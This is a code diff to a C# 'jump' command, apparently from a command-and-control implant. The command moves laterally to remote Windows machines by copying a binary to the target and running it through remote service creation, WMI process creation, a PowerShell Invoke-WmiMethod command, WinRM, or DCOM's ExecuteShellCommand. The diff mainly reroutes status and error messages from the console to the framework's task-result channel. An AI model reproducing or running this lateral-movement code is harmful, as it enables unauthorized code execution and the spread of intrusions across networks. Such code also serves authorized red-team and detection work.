@@ -8,7 +8,6 @@ using System.Management;
 using System.Management.Automation.Runspaces;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using WSManAutomation;
 using System.Text;
 using System.Threading.Tasks;
 using System.IO;
@@ -21,13 +20,15 @@ namespace Engineer.Commands
     internal class jump : EngineerCommand
     {
         public override string Name => "jump";
+        private static EngineerTask currentTask { get; set;}
 
         public override async Task Execute(EngineerTask task)
         {
+            currentTask = task;
             if (task.Arguments.TryGetValue("/target", out string target))
             {
                 target = target.TrimStart(' ');
-                Console.WriteLine("Planning to jump to target " + target);
+                Tasking.FillTaskResults("Planning to jump to target " + target, task, EngTaskStatus.Running,TaskResponseType.String);
             }
             else
             {
@@ -40,7 +41,7 @@ namespace Engineer.Commands
                 //ignoring case if the method string does not equal psexec wmi winrm tell the user invalid method and print the valid methods
                 if (method.ToLower() == "psexec" || method.ToLower() == "wmi" || method.ToLower() == "winrm" || method.ToLower() == "wmi-ps" || method.ToLower() == "dcom")
                 {
-                    Console.WriteLine("Using method " + method);
+                    Tasking.FillTaskResults("Using method " + method, task, EngTaskStatus.Running,TaskResponseType.String);
                 }
                 else
                 {
@@ -92,7 +93,7 @@ namespace Engineer.Commands
                 IntPtr serviceManagerHandle = WinAPIs.Advapi.OpenSCManager(target, null, WinAPIs.Advapi.SC_MANAGER_ALL_ACCESS);
                 if (serviceManagerHandle == IntPtr.Zero)
                 {
-                    Console.WriteLine("error: " + "Failed to open service manager on target machine");
+                    Tasking.FillTaskResults("error: " + "Failed to open service manager on target machine" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
                 // split the binary path into the directory and the binary name, copy the binary name over to the target machine windows directory
@@ -107,10 +108,9 @@ namespace Engineer.Commands
                 //check if the file exists on the target machine, if it does not exist then return an error
                 if (!File.Exists(targetBinaryDirectory))
                 {
-                    Console.WriteLine("error: " + "Failed to copy binary to target machine");
+                    Tasking.FillTaskResults("error: " + "Failed to copy binary to target machine" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
-                Console.WriteLine("Copied binary to target machine");
                 string targetBinary = targetBinaryDirectory;
 
 
@@ -118,17 +118,15 @@ namespace Engineer.Commands
                 IntPtr serviceHandle = WinAPIs.Advapi.CreateService(serviceManagerHandle, serviceName, serviceName, WinAPIs.Advapi.SERVICE_NO_CHANGE, WinAPIs.Advapi.SERVICE_WIN32_OWN_PROCESS, WinAPIs.Advapi.SERVICE_AUTO_START, WinAPIs.Advapi.SERVICE_ERROR_NORMAL, targetBinary, null, null, null, null, null);
                 if (serviceHandle == IntPtr.Zero)
                 {
-                    Console.WriteLine("error: " + "Failed to create service on target machine");
-                    Console.WriteLine(Marshal.GetLastWin32Error());
+                    Tasking.FillTaskResults("error: " + $"Failed to create service on target machine\n Error: {Marshal.GetLastWin32Error()}", currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
                 if (WinAPIs.Advapi.StartService(serviceHandle, 0, null) == false)
                 {
-                    Console.WriteLine("error: " + "Failed to start service on target machine");
+                    Tasking.FillTaskResults("error: " + $"Failed to start service on target" + target, currentTask, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
-                Console.WriteLine("Successfully created service on target machine");
-                Console.WriteLine("Successfully started service on target machine");
+                Tasking.FillTaskResults("Successfully started service on target machine" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
                 // close the service manager
                 WinAPIs.Advapi.CloseServiceHandle(serviceManagerHandle);
                 // close the service
@@ -137,8 +135,7 @@ namespace Engineer.Commands
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+                Tasking.FillTaskResults($"{e.Message}" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
             }
            
 
@@ -163,25 +160,25 @@ namespace Engineer.Commands
             //check if the file exists on the target machine, if it does not exist then return an error
             if (!File.Exists(targetBinaryDirectory))
             {
-                Console.WriteLine("error: " + "Failed to copy binary to target machine");
+                Tasking.FillTaskResults("error: " + "Failed to copy binary to target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
-            Console.WriteLine("Copied binary to target machine");
+            Tasking.FillTaskResults($"copied binary {binaryName} to target machine" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
             string targetBinary = targetBinaryDirectory;
 
             inParams["CommandLine"] = targetBinary;
             ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
-            Console.WriteLine("Successfully created process on target machine");
+            Tasking.FillTaskResults("Created process on target machine" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
         }
 
         public static void jumpWMIPS(string target, byte[] binary)
         {
             //create a powershell object and runner to execute Invoke-WmiMethod -class win32_process -computerName target -name create -argumentList binary
-            Console.WriteLine("Testing WMi-Connection and Uploading binary to target Windows dir and then Invoking WMI via powershell to run target binary");
+            Tasking.FillTaskResults("Testing WMi-Connection and Uploading binary to target Windows dir and then Invoking WMI via powershell to run target binary" + target, currentTask, EngTaskStatus.Running,TaskResponseType.String);
             string testConnection = $"Get-WmiObject -query \"SELECT * FROM Win32_OperatingSystem\" -ComputerName {target}";
             if (!RunPs(testConnection))
             {
-                Console.WriteLine("error: " + "Failed to connect to target machine");
+                Tasking.FillTaskResults("error: Failed to connect to the target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
             //create random name for the binary
@@ -194,16 +191,15 @@ namespace Engineer.Commands
             //check if the file exists on the target machine, if it does not exist then return an error
             if (!File.Exists(targetBinaryDirectory))
             {
-                Console.WriteLine("error: " + "Failed to copy binary to target machine");
+                Tasking.FillTaskResults($"error: Failed to copy binary {binaryName} to target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
-            Console.WriteLine("Copied binary to target machine");
             string targetBinary = targetBinaryDirectory;
 
             string command = $"Invoke-WmiMethod -class win32_process -computerName {target} -name create -argumentList {targetBinary}";
             if (!RunPs(command))
             {
-                Console.WriteLine("error: " + "Failed to run command on target machine");
+                Tasking.FillTaskResults("error: Failed to start binary on target machine" + target, currentTask, EngTaskStatus.Failed,TaskResponseType.String);
                 return;
             }
         }
@@ -214,7 +210,7 @@ namespace Engineer.Commands
             var conn = new WSManConnectionInfo(uri);
             if (conn.ConnectionUri != null)
             {
-                Console.WriteLine("Successfully connected to target machine at " + conn.ConnectionUri);
+                Tasking.FillTaskResults("Successfully connected to target machine at " + conn.ConnectionUri, currentTask, EngTaskStatus.Running,TaskResponseType.String);
             }
 
             string binaryb64 = Convert.ToBase64String(binary);
@@ -251,20 +247,19 @@ namespace Engineer.Commands
             //check if the file exists on the target machine, if it does not exist then return an error
             if (!File.Exists(targetBinaryDirectory))
             {
-                Console.WriteLine("error: " + "Failed to copy binary to target machine");
+                //Console.WriteLine("error: " + "Failed to copy binary to target machine");
                 return;
             }
-            Console.WriteLine("Copied binary to target machine");
+            //Console.WriteLine("Copied binary to target machine");
             string targetBinary = targetBinaryDirectory;
 
             var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
             view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view, new object[] { targetBinary, null, null, "7" });
-            Console.WriteLine("Successfully executed binary on target machine");
+            //Console.WriteLine("Successfully executed binary on target machine");
         }
 
         public static bool RunPs(string command)
         {
-            Console.WriteLine("Running command: " + command);
             {
                 using (PowerShell ps = PowerShell.Create())
                 {
@@ -275,7 +270,7 @@ namespace Engineer.Commands
                     PSDataCollection<object> results = new PSDataCollection<object>();
                     ps.Streams.Error.DataAdded += (sender, e) =>
                     {
-                        Console.WriteLine("Error");
+                        //Console.WriteLine("Error");
                         results.Add("Error");
                         foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
                         {
@@ -306,7 +301,7 @@ namespace Engineer.Commands
                     ps.Invoke(null, results);
                     string output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                     ps.Commands.Clear();
-                    Console.WriteLine(output);
+                   // Console.WriteLine(output);
                     // if output contains the string "Error" then return false
                     if (output.Contains("Error") || output.Contains("error"))
                     {
